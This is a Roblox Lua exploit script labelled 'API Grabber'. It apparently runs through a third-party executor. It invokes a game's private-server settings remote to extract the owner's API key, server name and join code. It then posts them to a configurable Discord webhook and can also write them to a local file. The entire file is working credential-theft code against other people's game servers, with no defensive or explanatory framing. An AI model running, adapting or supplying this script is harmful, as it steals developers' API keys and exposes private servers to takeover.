if not game:IsLoaded() then
    game.Loaded:Wait()
end

local replicatedStorage = game:GetService("ReplicatedStorage")
local httpService = game:GetService("HttpService")

local settings = {
    download = false,
    robloxApiKey = nil,
    baseDownloadLocation = "asset_taker/",
    cookie = nil,
    sendToWebhook = true,
    webhookURL = nil,
}

local serverName, joinCode = nil, nil

local function safeCall(func, ...)
    local success, result = pcall(func, ...)
    if not success then
        return nil, tostring(result)
    end
    return result
end

local function safeGetServerData()
    local privateServers = replicatedStorage:FindFirstChild("PrivateServers")
    if not privateServers then return nil end
    
    local info = privateServers:FindFirstChild("Info")
    if not info then return nil end
    
    local serverNameValue = info:FindFirstChild("ServerName")
    local codeValue = info:FindFirstChild("Code")
    
    if serverNameValue and codeValue then
        local nameSuccess, name = pcall(function() return serverNameValue.Value end)
        local codeSuccess, code = pcall(function() return codeValue.Value end)
        if nameSuccess and codeSuccess then
            serverName = name
            joinCode = code
        end
    end
    
    local getSettings = privateServers:FindFirstChild("GetSettings")
    if not getSettings then return nil end
    
    local success, result = pcall(function()
        return getSettings:InvokeServer()
    end)
    
    if not success then return nil end
    return result
end

local function safeGetAPIKey(serverData)
    if not serverData then return nil end
    if not serverData.APIData then return nil end
    return serverData.APIData.APIKey
end

local function safeSendToDiscord(apiKey, sName, jCode)
    if not settings.sendToWebhook then return true end
    if not settings.webhookURL then return true end
    if type(settings.webhookURL) ~= "string" then return true end
    if not string.find(settings.webhookURL, "discord.com/api/webhooks/") then return true end
    
    local embed = {
        title = "API Key Retrieved",
        color = 3066993,
        fields = {
            { name = "Server Name", value = tostring(sName or "Unknown"), inline = true },
            { name = "Join Code", value = tostring(jCode or "Unknown"), inline = true },
            { name = "API Key", value = "```" .. tostring(apiKey or "Not Found") .. "```", inline = false },
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    local success = pcall(function()
        request({
            Url = settings.webhookURL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = httpService:JSONEncode({ embeds = { embed } })
        })
    end)
    
    return success
end

local function safeNotify(title, text)
    local success = pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = tostring(title),
            Text = tostring(text),
            Duration = 3
        })
    end)
    if not success then
        print("[" .. title .. "] " .. text)
    end
end

local function safeWriteFile(path, content)
    local success = pcall(function()
        makefolder(string.match(path, "(.-)[^\\/]+$") or "")
        writefile(path, tostring(content))
    end)
    return success
end

local function main()
    safeNotify("API Grabber", "Starting...")
    
    local serverData = safeGetServerData()
    if not serverData then
        safeNotify("Error", "Could not fetch server data")
        return
    end
    
    local apiKey = safeGetAPIKey(serverData)
    if not apiKey then
        safeNotify("Warning", "No API key found in server data")
        apiKey = "No API key found"
    else
        safeNotify("Success", "API key retrieved")
    end
    
    local currentServerName = serverName or "Unknown"
    local currentJoinCode = joinCode or "Unknown"
    
    local dataName = nil
    local dataCode = nil
    if serverData and serverData.Data then
        dataName = serverData.Data.Name
        dataCode = serverData.Data.CurrKey
    end
    
    local finalServerName = dataName or currentServerName
    local finalJoinCode = dataCode or currentJoinCode
    
    safeSendToDiscord(apiKey, finalServerName, finalJoinCode)
    
    if settings.download then
        local folderPath = settings.baseDownloadLocation .. (finalServerName:gsub('[<>:"/\\|?*]', "_") or "server")
        local fileContent = "Server: " .. tostring(finalServerName) .. "\nJoin Code: " .. tostring(finalJoinCode) .. "\nAPI Key: " .. tostring(apiKey)
        safeWriteFile(folderPath .. "/api_key.txt", fileContent)
        safeNotify("Saved", "API key saved to file")
    end
    
    safeNotify("Complete", "API key retrieval finished")
end

local function safeStart(config)
    if config then
        for k, v in pairs(config) do
            if k ~= "webhook" then
                settings[k] = v
            end
        end
        if config.webhook then
            for k, v in pairs(config.webhook) do
                settings.webhook[k] = v
            end
        end
    end
    
    local success, err = pcall(main)
    if not success then
        safeNotify("Fatal Error", "Script encountered an error: " .. tostring(err))
        print("Fatal Error:", err)
    end
end

return function(config)
    safeStart(config)
end
